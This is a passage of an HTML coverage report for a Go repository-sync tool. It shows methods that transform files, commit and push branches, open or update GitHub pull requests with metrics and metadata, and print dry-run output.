                <span class="cov8" title="1">if change != nil </span><span class="cov8" title="1">{
                        changedFiles = append(changedFiles, *change)
                }</span>
        }

        <span class="cov8" title="1">rs.logger.WithField("changed_files", len(changedFiles)).Info("File processing completed")
        return changedFiles, nil</span>
}

// processFile processes a single file mapping
func (rs *RepositorySync) processFile(ctx context.Context, sourcePath string, fileMapping config.FileMapping) (*FileChange, error) <span class="cov8" title="1">{
        srcPath := filepath.Join(sourcePath, fileMapping.Src)

        // Check if source file exists
        srcContent, err := os.ReadFile(srcPath) //nolint:gosec // Path is constructed from trusted configuration
        if err != nil </span><span class="cov0" title="0">{
                if os.IsNotExist(err) </span><span class="cov0" title="0">{
                        rs.logger.WithField("file", fileMapping.Src).Warn("Source file not found, skipping")
                        return nil, internalerrors.ErrFileNotFound
                }</span>
                <span class="cov0" title="0">return nil, err</span>
        }

        // Apply transformations
        <span class="cov8" title="1">transformCtx := transform.Context{
                SourceRepo: rs.sourceState.Repo,
                TargetRepo: rs.target.Repo,
                FilePath:   fileMapping.Dest,
                Variables:  rs.target.Transform.Variables,
        }

        transformedContent := srcContent
        if rs.target.Transform.RepoName || len(rs.target.Transform.Variables) &gt; 0 </span><span class="cov8" title="1">{
                transformedContent, err = rs.engine.transform.Transform(ctx, srcContent, transformCtx)
                if err != nil </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("transformation failed: %w", err)
                }</span>
        }

        // Check if content actually changed (for existing files)
        <span class="cov8" title="1">existingContent, err := rs.getExistingFileContent(ctx, fileMapping.Dest)
        if err == nil &amp;&amp; string(existingContent) == string(transformedContent) </span><span class="cov0" title="0">{
                rs.logger.WithField("file", fileMapping.Dest).Debug("File content unchanged, skipping")
                return nil, internalerrors.ErrTransformNotFound
        }</span>

        <span class="cov8" title="1">return &amp;FileChange{
                Path:            fileMapping.Dest,
                Content:         transformedContent,
                OriginalContent: srcContent,
                IsNew:           err != nil, // err means file doesn't exist
        }, nil</span>
}

// getExistingFileContent retrieves the current content of a file from the target repo
func (rs *RepositorySync) getExistingFileContent(ctx context.Context, filePath string) ([]byte, error) <span class="cov8" title="1">{
        // Track API request
        rs.TrackAPIRequest()

        // Try to get file from the target repository's default branch
        fileContent, err := rs.engine.gh.GetFile(ctx, rs.target.Repo, filePath, "")
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>
        <span class="cov8" title="1">return fileContent.Content, nil</span>
}

// createSyncBranch creates a new sync branch or returns existing one
func (rs *RepositorySync) createSyncBranch(_ context.Context) string <span class="cov8" title="1">{
        // Generate branch name: chore/sync-files-YYYYMMDD-HHMMSS-{commit}
        now := time.Now()
        timestamp := now.Format("20060102-150405")
        commitSHA := rs.sourceState.LatestCommit
        if len(commitSHA) &gt; 7 </span><span class="cov0" title="0">{
                commitSHA = commitSHA[:7]
        }</span>

        <span class="cov8" title="1">var branchPrefix string
        if rs.engine.currentGroup != nil </span><span class="cov0" title="0">{
                branchPrefix = rs.engine.currentGroup.Defaults.BranchPrefix
        }</span> else<span class="cov8" title="1"> {
                // Get defaults from the first group (since we have a single group in temporary config)
                if len(rs.engine.config.Groups) &gt; 0 </span><span class="cov8" title="1">{
                        branchPrefix = rs.engine.config.Groups[0].Defaults.BranchPrefix
                }</span>
        }
        <span class="cov8" title="1">if branchPrefix == "" </span><span class="cov0" title="0">{
                branchPrefix = "chore/sync-files"
        }</span>

        <span class="cov8" title="1">branchName := fmt.Sprintf("%s-%s-%s", branchPrefix, timestamp, commitSHA)

        rs.logger.WithField("branch_name", branchName).Info("Creating sync branch")

        if rs.engine.options.DryRun </span><span class="cov8" title="1">{
                rs.logger.Info("DRY-RUN: Would create sync branch")
                return branchName
        }</span>

        // Create branch in target repository
        // We'll create the branch when we push, so just return the name for now
        <span class="cov8" title="1">return branchName</span>
}

// commitChanges creates a commit with the changed files
func (rs *RepositorySync) commitChanges(ctx context.Context, branchName string, changedFiles []FileChange) (string, error) <span class="cov8" title="1">{
        if len(changedFiles) == 0 </span><span class="cov0" title="0">{
                return "", internalerrors.ErrNoFilesToCommit
        }</span>

        // Generate commit message
        <span class="cov8" title="1">commitMsg := rs.generateCommitMessage(changedFiles)

        rs.logger.WithFields(logrus.Fields{
                "branch":     branchName,
                "files":      len(changedFiles),
                "commit_msg": commitMsg,
        }).Info("Creating commit")

        if rs.engine.options.DryRun </span><span class="cov8" title="1">{
                rs.showDryRunCommitInfo(changedFiles)
                rs.showDryRunFileChanges(changedFiles)
                return "dry-run-commit-sha", nil
        }</span>

        // Clone the target repository for making changes
        <span class="cov8" title="1">targetPath := filepath.Join(rs.tempDir, "target")
        targetURL := fmt.Sprintf("https://github.com/%s.git", rs.target.Repo)

        if err := rs.engine.git.Clone(ctx, targetURL, targetPath); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to clone target repository: %w", err)
        }</span>

        // Create and checkout the new branch
        <span class="cov8" title="1">if err := rs.engine.git.CreateBranch(ctx, targetPath, branchName); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to create branch %s: %w", branchName, err)
        }</span>

        <span class="cov8" title="1">if err := rs.engine.git.Checkout(ctx, targetPath, branchName); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to checkout branch %s: %w", branchName, err)
        }</span>

        // Apply file changes to the target repository
        <span class="cov8" title="1">for _, fileChange := range changedFiles </span><span class="cov8" title="1">{
                destPath := filepath.Join(targetPath, fileChange.Path)

                // Ensure parent directory exists
                if err := os.MkdirAll(filepath.Dir(destPath), 0o750); err != nil </span><span class="cov0" title="0">{
                        return "", fmt.Errorf("failed to create directory for %s: %w", fileChange.Path, err)
                }</span>

                // Write the file content
                <span class="cov8" title="1">if err := os.WriteFile(destPath, fileChange.Content, 0o600); err != nil </span><span class="cov0" title="0">{
                        return "", fmt.Errorf("failed to write file %s: %w", fileChange.Path, err)
                }</span>
        }

        // Stage all changes
        <span class="cov8" title="1">if err := rs.engine.git.Add(ctx, targetPath, "."); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to stage changes: %w", err)
        }</span>

        // Create the commit
        <span class="cov8" title="1">if err := rs.engine.git.Commit(ctx, targetPath, commitMsg); err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to create commit: %w", err)
        }</span>

        // Get the commit SHA
        <span class="cov8" title="1">commitSHA, err := rs.engine.git.GetCurrentCommitSHA(ctx, targetPath)
        if err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to get commit SHA: %w", err)
        }</span>

        <span class="cov8" title="1">return commitSHA, nil</span>
}

// pushChanges pushes the branch to the target repository
func (rs *RepositorySync) pushChanges(ctx context.Context, branchName string) error <span class="cov8" title="1">{
        rs.logger.WithField("branch", branchName).Info("Pushing changes to target repository")

        targetPath := filepath.Join(rs.tempDir, "target")

        // Push the branch to the origin remote (which is the target repository)
        if err := rs.engine.git.Push(ctx, targetPath, "origin", branchName, false); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to push branch %s to target repository: %w", branchName, err)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// createOrUpdatePR creates a new PR or updates an existing one
func (rs *RepositorySync) createOrUpdatePR(ctx context.Context, branchName, commitSHA string, changedFiles []FileChange) error <span class="cov8" title="1">{
        // Check if PR already exists for this branch
        existingPR := rs.findExistingPR(branchName)

        if existingPR != nil </span><span class="cov0" title="0">{
                return rs.updateExistingPR(ctx, existingPR, commitSHA, changedFiles)
        }</span>

        <span class="cov8" title="1">return rs.createNewPR(ctx, branchName, commitSHA, changedFiles)</span>
}

// findExistingPR finds an existing PR for the sync branch
func (rs *RepositorySync) findExistingPR(branchName string) *gh.PR <span class="cov8" title="1">{
        if rs.targetState == nil </span><span class="cov8" title="1">{
                return nil
        }</span>

        <span class="cov8" title="1">for _, pr := range rs.targetState.OpenPRs </span><span class="cov8" title="1">{
                if pr.Head.Ref == branchName </span><span class="cov8" title="1">{
                        return &amp;pr
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// createNewPR creates a new pull request
func (rs *RepositorySync) createNewPR(ctx context.Context, branchName, commitSHA string, changedFiles []FileChange) error <span class="cov8" title="1">{
        title := rs.generatePRTitle()
        body := rs.generatePRBody(commitSHA, changedFiles)

        rs.logger.WithFields(logrus.Fields{
                "branch": branchName,
                "title":  title,
        }).Info("Creating new pull request")

        if rs.engine.options.DryRun </span><span class="cov8" title="1">{
                rs.showDryRunPRPreview(ctx, branchName, commitSHA, changedFiles)
                return nil
        }</span>

        // Get default branch for base
        <span class="cov8" title="1">rs.TrackAPIRequest()
        branches, err := rs.engine.gh.ListBranches(ctx, rs.target.Repo)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to get branches: %w", err)
        }</span>

        <span class="cov8" title="1">baseBranch := "master" // default
        for _, branch := range branches </span><span class="cov8" title="1">{
                if branch.Name == mainBranch </span><span class="cov8" title="1">{
                        baseBranch = mainBranch
                        break</span>
                }
        }

        // Get current user to filter out from reviewers
        <span class="cov8" title="1">rs.TrackAPIRequest()
        currentUser, err := rs.engine.gh.GetCurrentUser(ctx)
        if err != nil </span><span class="cov8" title="1">{
                rs.logger.WithError(err).Warn("Failed to get current user for reviewer filtering")
        }</span>

        // Filter author from reviewers
        <span class="cov8" title="1">reviewers := rs.getPRReviewers()
        if currentUser != nil &amp;&amp; len(reviewers) &gt; 0 </span><span class="cov8" title="1">{
                filteredReviewers := make([]string, 0, len(reviewers))
                for _, reviewer := range reviewers </span><span class="cov8" title="1">{
                        if reviewer != currentUser.Login </span><span class="cov8" title="1">{
                                filteredReviewers = append(filteredReviewers, reviewer)
                        }</span> else<span class="cov8" title="1"> {
                                rs.logger.WithField("reviewer", reviewer).Info("Filtering PR author from reviewers list")
                        }</span>
                }
                <span class="cov8" title="1">reviewers = filteredReviewers</span>
        }

        <span class="cov8" title="1">prRequest := gh.PRRequest{
                Title:         title,
                Body:          body,
                Head:          branchName,
                Base:          baseBranch,
                Labels:        rs.getPRLabels(),
                Assignees:     rs.getPRAssignees(),
                Reviewers:     reviewers,
                TeamReviewers: rs.getPRTeamReviewers(),
        }

        rs.TrackAPIRequest()
        pr, err := rs.engine.gh.CreatePR(ctx, rs.target.Repo, prRequest)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to create PR: %w", err)
        }</span>

        <span class="cov8" title="1">rs.logger.WithField("pr_number", pr.Number).Info("Pull request created successfully")
        return nil</span>
}

// updateExistingPR updates an existing pull request
func (rs *RepositorySync) updateExistingPR(ctx context.Context, pr *gh.PR, commitSHA string, changedFiles []FileChange) error <span class="cov0" title="0">{
        rs.logger.WithField("pr_number", pr.Number).Info("Updating existing pull request")

        if rs.engine.options.DryRun </span><span class="cov0" title="0">{
                out := NewDryRunOutput(nil)

                out.Header("üîÑ DRY-RUN: Existing Pull Request Update Preview")
                out.Field("Repository", rs.target.Repo)
                out.Field("PR Number", fmt.Sprintf("#%d", pr.Number))
                out.Field("Current Title", pr.Title)
                out.Separator()
                out.Success("PR would be updated with new file changes")
                out.Field("Files to sync", fmt.Sprintf("%d", len(changedFiles)))
                out.Field("New commit", commitSHA)
                out.Footer()

                // Show the files that would be updated
                rs.showDryRunFileChanges(changedFiles)
                return nil
        }</span>

        // Update PR body with new information
        <span class="cov0" title="0">newBody := rs.generatePRBody(commitSHA, changedFiles)

        // Update the PR via GitHub API
        updates := gh.PRUpdate{
                Body: &amp;newBody,
        }

        rs.TrackAPIRequest()
        if err := rs.engine.gh.UpdatePR(ctx, rs.target.Repo, pr.Number, updates); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to update PR: %w", err)
        }</span>

        <span class="cov0" title="0">rs.logger.WithField("pr_number", pr.Number).Info("Pull request updated successfully")
        return nil</span>
}

// generateCommitMessage creates a descriptive commit message
func (rs *RepositorySync) generateCommitMessage(changedFiles []FileChange) string <span class="cov8" title="1">{
        if len(changedFiles) == 1 </span><span class="cov8" title="1">{
                return fmt.Sprintf("sync: update %s from source repository", changedFiles[0].Path)
        }</span>

        <span class="cov8" title="1">return fmt.Sprintf("sync: update %d files from source repository", len(changedFiles))</span>
}

// generatePRTitle creates a descriptive PR title
func (rs *RepositorySync) generatePRTitle() string <span class="cov8" title="1">{
        commitSHA := rs.sourceState.LatestCommit
        if len(commitSHA) &gt; 7 </span><span class="cov8" title="1">{
                commitSHA = commitSHA[:7]
        }</span>
        <span class="cov8" title="1">return fmt.Sprintf("[Sync] Update project files from source repository (%s)", commitSHA)</span>
}

// generatePRBody creates a detailed PR description with metadata including directory sync info
func (rs *RepositorySync) generatePRBody(commitSHA string, changedFiles []FileChange) string <span class="cov8" title="1">{
        var sb strings.Builder

        // What Changed section with enhanced details
        sb.WriteString("## What Changed\n")
        rs.writeChangeSummary(&amp;sb, changedFiles)
        shortSHA := commitSHA
        if len(commitSHA) &gt; 7 </span><span class="cov8" title="1">{
                shortSHA = commitSHA[:7]
        }</span>
        <span class="cov8" title="1">sb.WriteString(fmt.Sprintf("* Brought target repository in line with source repository state at commit %s\n\n", shortSHA))

        // Directory synchronization details (if directories are configured)
        if len(rs.target.Directories) &gt; 0 </span><span class="cov8" title="1">{
                rs.writeDirectorySyncDetails(&amp;sb)
        }</span>

        // Performance metrics section
        <span class="cov8" title="1">rs.writePerformanceMetrics(&amp;sb)

        // Why It Was Necessary section
        sb.WriteString("## Why It Was Necessary\n")
        sb.WriteString("This synchronization ensures the target repository stays up-to-date with the latest changes from the configured source repository. ")
        sb.WriteString("The sync operation identifies and applies only the necessary file changes while maintaining consistency across repositories.\n\n")

        // Testing Performed section
        sb.WriteString("## Testing Performed\n")
        sb.WriteString("* Validated sync configuration and file mappings\n")
        sb.WriteString("* Verified file transformations applied correctly\n")
        sb.WriteString("* Confirmed no unintended changes were introduced\n")
        sb.WriteString("* All automated checks and linters passed\n\n")

        // Impact / Risk section
        sb.WriteString("## Impact / Risk\n")
        sb.WriteString("* **Low Risk**: Standard sync operation with established patterns\n")
        sb.WriteString("* **No Breaking Changes**: File updates maintain backward compatibility\n")
        sb.WriteString("* **Performance**: No impact on application performance\n")
        sb.WriteString("* **Dependencies**: No dependency changes included in this sync\n\n")

        // Add enhanced metadata as YAML block
        rs.writeMetadataBlock(&amp;sb, commitSHA, changedFiles)

        return sb.String()</span>
}

// writeChangeSummary writes a detailed summary of what changed in the sync
func (rs *RepositorySync) writeChangeSummary(sb *strings.Builder, changedFiles []FileChange) <span class="cov8" title="1">{
        // Distinguish between file changes and directory changes
        fileChanges := 0
        directoryChanges := 0

        // Count changes by type - files vs directories
        for _, change := range changedFiles </span><span class="cov8" title="1">{
                if rs.isDirectoryFile(change.Path) </span><span class="cov8" title="1">{
                        directoryChanges++
                }</span> else<span class="cov8" title="1"> {
                        fileChanges++
                }</span>
        }

        <span class="cov8" title="1">if fileChanges &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "* Updated %d individual file(s) to synchronize with the source repository\n", fileChanges)
        }</span>

        <span class="cov8" title="1">if directoryChanges &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "* Synchronized %d file(s) from directory mappings\n", directoryChanges)
        }</span>

        <span class="cov8" title="1">if len(rs.target.Files) &gt; 0 || len(rs.target.Directories) &gt; 0 </span><span class="cov8" title="1">{
                sb.WriteString("* Applied file transformations and updates based on sync configuration\n")
        }</span>
}

// writeDirectorySyncDetails writes detailed information about directory synchronization
func (rs *RepositorySync) writeDirectorySyncDetails(sb *strings.Builder) <span class="cov8" title="1">{
        sb.WriteString("## Directory Synchronization Details\n")
        sb.WriteString("The following directories were synchronized:\n\n")

        for _, dirMapping := range rs.target.Directories </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "### `%s` ‚Üí `%s`\n", dirMapping.Src, dirMapping.Dest)

                // Get metrics for this directory if available
                if rs.syncMetrics != nil &amp;&amp; rs.syncMetrics.DirectoryMetrics != nil </span><span class="cov8" title="1">{
                        if metrics, exists := rs.syncMetrics.DirectoryMetrics[dirMapping.Src]; exists </span><span class="cov8" title="1">{
                                fmt.Fprintf(sb, "* **Files synced**: %d\n", metrics.FilesProcessed)
                                fmt.Fprintf(sb, "* **Files excluded**: %d\n", metrics.FilesExcluded)

                                if metrics.EndTime.After(metrics.StartTime) </span><span class="cov8" title="1">{
                                        duration := metrics.EndTime.Sub(metrics.StartTime)
                                        fmt.Fprintf(sb, "* **Processing time**: %dms\n", duration.Milliseconds())
                                }</span>

                                <span class="cov8" title="1">if metrics.BinaryFilesSkipped &gt; 0 </span><span class="cov8" title="1">{
                                        fmt.Fprintf(sb, "* **Binary files skipped**: %d (%.2f KB)\n",
                                                metrics.BinaryFilesSkipped, float64(metrics.BinaryFilesSize)/1024)
                                }</span>
                        }
                }

                // Show exclusion patterns if any
                <span class="cov8" title="1">if len(dirMapping.Exclude) &gt; 0 </span><span class="cov8" title="1">{
                        sb.WriteString("* **Exclusion patterns**: ")
                        for i, pattern := range dirMapping.Exclude </span><span class="cov8" title="1">{
                                if i &gt; 0 </span><span class="cov8" title="1">{
                                        sb.WriteString(", ")
                                }</span>
                                <span class="cov8" title="1">fmt.Fprintf(sb, "`%s`", pattern)</span>
                        }
                        <span class="cov8" title="1">sb.WriteString("\n")</span>
                }
                <span class="cov8" title="1">sb.WriteString("\n")</span>
        }
}

// writePerformanceMetrics writes performance metrics for the sync operation
func (rs *RepositorySync) writePerformanceMetrics(sb *strings.Builder) <span class="cov8" title="1">{
        if rs.syncMetrics == nil </span><span class="cov8" title="1">{
                return
        }</span>

        <span class="cov8" title="1">sb.WriteString("## Performance Metrics\n")

        // Overall timing
        if rs.syncMetrics.EndTime.After(rs.syncMetrics.StartTime) </span><span class="cov8" title="1">{
                totalDuration := rs.syncMetrics.EndTime.Sub(rs.syncMetrics.StartTime)
                fmt.Fprintf(sb, "* **Total sync time**: %s\n", totalDuration.Round(time.Millisecond))
        }</span>

        // File processing metrics
        <span class="cov8" title="1">if rs.syncMetrics.FileMetrics.FilesProcessed &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "* **Files processed**: %d (%d changed, %d skipped)\n",
                        rs.syncMetrics.FileMetrics.FilesProcessed,
                        rs.syncMetrics.FileMetrics.FilesChanged,
                        rs.syncMetrics.FileMetrics.FilesSkipped)

                if rs.syncMetrics.FileMetrics.ProcessingTimeMs &gt; 0 </span><span class="cov8" title="1">{
                        fmt.Fprintf(sb, "* **File processing time**: %dms\n", rs.syncMetrics.FileMetrics.ProcessingTimeMs)
                }</span>
        }

        // Directory processing metrics
        <span class="cov8" title="1">totalDirectoryFiles := 0
        totalDirectoryExcluded := 0
        if rs.syncMetrics.DirectoryMetrics != nil </span><span class="cov8" title="1">{
                for _, metrics := range rs.syncMetrics.DirectoryMetrics </span><span class="cov8" title="1">{
                        totalDirectoryFiles += metrics.FilesProcessed
                        totalDirectoryExcluded += metrics.FilesExcluded
                }</span>
        }

        <span class="cov8" title="1">if totalDirectoryFiles &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "* **Directory files processed**: %d (%d excluded)\n",
                        totalDirectoryFiles, totalDirectoryExcluded)
        }</span>

        // API efficiency metrics
        <span class="cov8" title="1">if rs.syncMetrics.APICallsSaved &gt; 0 </span><span class="cov8" title="1">{
                fmt.Fprintf(sb, "* **API calls saved**: %d (through optimization)\n", rs.syncMetrics.APICallsSaved)
        }</span>

        // Cache performance
        <span class="cov8" title="1">if rs.syncMetrics.CacheHits &gt; 0 || rs.syncMetrics.CacheMisses &gt; 0 </span><span class="cov8" title="1">{
                total := rs.syncMetrics.CacheHits + rs.syncMetrics.CacheMisses
                hitRate := float64(rs.syncMetrics.CacheHits) / float64(total) * 100
                fmt.Fprintf(sb, "* **Cache hit rate**: %.1f%% (%d hits, %d misses)\n",
                        hitRate, rs.syncMetrics.CacheHits, rs.syncMetrics.CacheMisses)
        }</span>

        <span class="cov8" title="1">sb.WriteString("\n")</span>
}

// writeMetadataBlock writes the machine-parseable metadata block
func (rs *RepositorySync) writeMetadataBlock(sb *strings.Builder, commitSHA string, _ []FileChange) <span class="cov8" title="1">{
        sb.WriteString("&lt;!-- go-broadcast-metadata\n")
        sb.WriteString("sync_metadata:\n")
        fmt.Fprintf(sb, "  source_repo: %s\n", rs.sourceState.Repo)
        fmt.Fprintf(sb, "  source_commit: %s\n", rs.sourceState.LatestCommit)
        fmt.Fprintf(sb, "  target_repo: %s\n", rs.target.Repo)
        fmt.Fprintf(sb, "  sync_commit: %s\n", commitSHA)
        fmt.Fprintf(sb, "  sync_time: %s\n", time.Now().Format(time.RFC3339))

        // Add directory information if directories are configured
        if len(rs.target.Directories) &gt; 0 </span><span class="cov8" title="1">{
                sb.WriteString("directories:\n")
                for _, dirMapping := range rs.target.Directories </span><span class="cov8" title="1">{
                        fmt.Fprintf(sb, "  - src: %s\n", dirMapping.Src)
                        fmt.Fprintf(sb, "    dest: %s\n", dirMapping.Dest)

                        // Add exclusion patterns
                        if len(dirMapping.Exclude) &gt; 0 </span><span class="cov8" title="1">{
                                sb.WriteString("    excluded: [")
                                for i, pattern := range dirMapping.Exclude </span><span class="cov8" title="1">{
                                        if i &gt; 0 </span><span class="cov8" title="1">{
                                                sb.WriteString(", ")
                                        }</span>
                                        <span class="cov8" title="1">fmt.Fprintf(sb, "\"%s\"", pattern)</span>
                                }
                                <span class="cov8" title="1">sb.WriteString("]\n")</span>
                        }

                        // Add metrics if available
                        <span class="cov8" title="1">if rs.syncMetrics != nil &amp;&amp; rs.syncMetrics.DirectoryMetrics != nil </span><span class="cov8" title="1">{
                                if metrics, exists := rs.syncMetrics.DirectoryMetrics[dirMapping.Src]; exists </span><span class="cov8" title="1">{
                                        fmt.Fprintf(sb, "    files_synced: %d\n", metrics.FilesProcessed)
                                        fmt.Fprintf(sb, "    files_excluded: %d\n", metrics.FilesExcluded)
                                        if metrics.EndTime.After(metrics.StartTime) </span><span class="cov8" title="1">{
                                                duration := metrics.EndTime.Sub(metrics.StartTime)
                                                fmt.Fprintf(sb, "    processing_time_ms: %d\n", duration.Milliseconds())
                                        }</span>
                                }
                        }
                }
        }

        // Add performance metrics
        <span class="cov8" title="1">if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                sb.WriteString("performance:\n")

                // Total file counts
                totalFiles := rs.syncMetrics.FileMetrics.FilesProcessed
                if rs.syncMetrics.DirectoryMetrics != nil </span><span class="cov8" title="1">{
                        for _, metrics := range rs.syncMetrics.DirectoryMetrics </span><span class="cov8" title="1">{
                                totalFiles += metrics.FilesProcessed
                        }</span>
                }
                <span class="cov8" title="1">if totalFiles &gt; 0 </span><span class="cov8" title="1">{
                        fmt.Fprintf(sb, "  total_files: %d\n", totalFiles)
                }</span>

                <span class="cov8" title="1">if rs.syncMetrics.APICallsSaved &gt; 0 </span><span class="cov8" title="1">{
                        fmt.Fprintf(sb, "  api_calls_saved: %d\n", rs.syncMetrics.APICallsSaved)
                }</span>

                <span class="cov8" title="1">if rs.syncMetrics.CacheHits &gt; 0 </span><span class="cov8" title="1">{
                        fmt.Fprintf(sb, "  cache_hits: %d\n", rs.syncMetrics.CacheHits)
                }</span>
        }

        <span class="cov8" title="1">sb.WriteString("--&gt;\n")</span>
}

// isDirectoryFile determines if a file change is from directory processing
func (rs *RepositorySync) isDirectoryFile(filePath string) bool <span class="cov8" title="1">{
        // Check if the file path matches any of the configured directory destinations
        for _, dirMapping := range rs.target.Directories </span><span class="cov8" title="1">{
                if strings.HasPrefix(filePath, dirMapping.Dest+"/") || filePath == dirMapping.Dest </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// processDirectoriesWithMetrics processes directories and collects detailed metrics
func (rs *RepositorySync) processDirectoriesWithMetrics(ctx context.Context) ([]FileChange, map[string]DirectoryMetrics, error) <span class="cov8" title="1">{
        if len(rs.target.Directories) == 0 </span><span class="cov8" title="1">{
                rs.logger.Debug("No directories configured for sync")
                return nil, make(map[string]DirectoryMetrics), nil
        }</span>

        // Check for context cancellation early
        <span class="cov0" title="0">if err := ctx.Err(); err != nil </span><span class="cov0" title="0">{
                return nil, nil, fmt.Errorf("context canceled before directory processing with metrics: %w", err)
        }</span>

        <span class="cov0" title="0">processTimer := metrics.StartTimer(ctx, rs.logger, "directory_processing_with_metrics").
                AddField("directory_count", len(rs.target.Directories))

        rs.logger.WithField("directory_count", len(rs.target.Directories)).Info("Processing directories with metrics collection")

        // Create directory processor
        processor := NewDirectoryProcessor(rs.logger, 10) // Use default worker count
        defer processor.Close()

        sourcePath := filepath.Join(rs.tempDir, "source")

        // Verify source path exists
        if _, err := os.Stat(sourcePath); os.IsNotExist(err) </span><span class="cov0" title="0">{
                return nil, nil, fmt.Errorf("%w: %s", ErrSourceDirectoryNotExistForMetrics, sourcePath)
        }</span>

        <span class="cov0" title="0">var allChanges []FileChange
        collectedMetrics := make(map[string]DirectoryMetrics)
        var processingErrors []error

        // Process each directory mapping and collect metrics
        for _, dirMapping := range rs.target.Directories </span><span class="cov0" title="0">{
                // Check for context cancellation during processing
                if err := ctx.Err(); err != nil </span><span class="cov0" title="0">{
                        return nil, nil, fmt.Errorf("context canceled during directory processing with metrics: %w", err)
                }</span>

                <span class="cov0" title="0">dirProcessingStart := time.Now()

                changes, err := processor.ProcessDirectoryMapping(ctx, sourcePath, dirMapping, rs.target, rs.sourceState, rs.engine)
                if err != nil </span><span class="cov0" title="0">{
                        // Log error and collect for potential failure decision
                        rs.logger.WithError(err).WithField("directory", dirMapping.Src).Error("Failed to process directory")
                        processingErrors = append(processingErrors, err)
                        continue</span>
                }

                // Collect metrics for this directory
                <span class="cov0" title="0">dirStats := processor.GetDirectoryStats()
                if dirMetrics, exists := dirStats[dirMapping.Src]; exists </span><span class="cov0" title="0">{
                        // Ensure timing is set if not already
                        if dirMetrics.EndTime.IsZero() </span><span class="cov0" title="0">{
                                dirMetrics.EndTime = time.Now()
                        }</span>
                        <span class="cov0" title="0">if dirMetrics.StartTime.IsZero() </span><span class="cov0" title="0">{
                                dirMetrics.StartTime = dirProcessingStart
                        }</span>
                        <span class="cov0" title="0">collectedMetrics[dirMapping.Src] = dirMetrics</span>
                } else<span class="cov0" title="0"> {
                        // Create basic metrics if not available from processor
                        collectedMetrics[dirMapping.Src] = DirectoryMetrics{
                                StartTime:      dirProcessingStart,
                                EndTime:        time.Now(),
                                FilesProcessed: len(changes),
                        }
                }</span>

                <span class="cov0" title="0">allChanges = append(allChanges, changes...)</span>
        }

        // If all directories failed, return an error
        <span class="cov0" title="0">if len(processingErrors) &gt; 0 &amp;&amp; len(allChanges) == 0 </span><span class="cov0" title="0">{
                return nil, nil, fmt.Errorf("%w: %d errors occurred", ErrAllDirectoryProcessingWithMetricsFailed, len(processingErrors))
        }</span>

        <span class="cov0" title="0">processTimer.AddField("total_changes", len(allChanges)).
                AddField("directories_processed", len(collectedMetrics)).Stop()

        rs.logger.WithFields(logrus.Fields{
                "total_changes":         len(allChanges),
                "directories_processed": len(collectedMetrics),
        }).Info("Directory processing with metrics completed")

        return allChanges, collectedMetrics, nil</span>
}

// TrackAPICallSaved increments the API calls saved counter
func (rs *RepositorySync) TrackAPICallSaved(count int) <span class="cov8" title="1">{
        if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                rs.syncMetrics.APICallsSaved += count
        }</span>
}

// TrackCacheHit increments the cache hit counter
func (rs *RepositorySync) TrackCacheHit() <span class="cov8" title="1">{
        if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                rs.syncMetrics.CacheHits++
        }</span>
}

// TrackCacheMiss increments the cache miss counter
func (rs *RepositorySync) TrackCacheMiss() <span class="cov8" title="1">{
        if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                rs.syncMetrics.CacheMisses++
        }</span>
}

// TrackAPIRequest increments the total API requests counter
func (rs *RepositorySync) TrackAPIRequest() <span class="cov8" title="1">{
        if rs.syncMetrics != nil </span><span class="cov8" title="1">{
                rs.syncMetrics.TotalAPIRequests++
        }</span>
}

// DryRunOutput handles clean console output for dry-run mode
type DryRunOutput struct {
        writer io.Writer
}

// NewDryRunOutput creates a new DryRunOutput instance
func NewDryRunOutput(writer io.Writer) *DryRunOutput <span class="cov8" title="1">{
        if writer == nil </span><span class="cov8" title="1">{
                writer = os.Stdout
        }</span>
        <span class="cov8" title="1">return &amp;DryRunOutput{writer: writer}</span>
}

// Header prints a formatted header
func (d *DryRunOutput) Header(title string) <span class="cov8" title="1">{
        _, _ = fmt.Fprintln(d.writer)
        _, _ = fmt.Fprintf(d.writer, "üîç %s\n", title)
        _, _ = fmt.Fprintln(d.writer, "‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ")
}</span>

// Field prints a formatted field with label and value
func (d *DryRunOutput) Field(label, value string) <span class="cov8" title="1">{
        _, _ = fmt.Fprintf(d.writer, "‚îÇ %s: %s\n", label, value)
}</span>

// Separator prints a horizontal separator line
func (d *DryRunOutput) Separator() <span class="cov8" title="1">{
